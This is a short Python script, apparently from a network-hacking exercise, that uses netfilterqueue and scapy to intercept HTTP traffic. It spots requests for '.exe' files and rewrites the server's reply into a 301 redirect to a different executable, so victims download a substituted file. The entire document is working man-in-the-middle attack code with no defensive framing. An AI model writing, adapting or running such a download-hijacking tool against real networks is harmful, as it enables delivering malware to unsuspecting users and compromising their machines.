#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list=[]


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('--> exe request')
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq )
                print('--> Replacing File')
                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently \n Location: https://www.rarlab.con/rar/wrar56b1.exe \n\n'
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



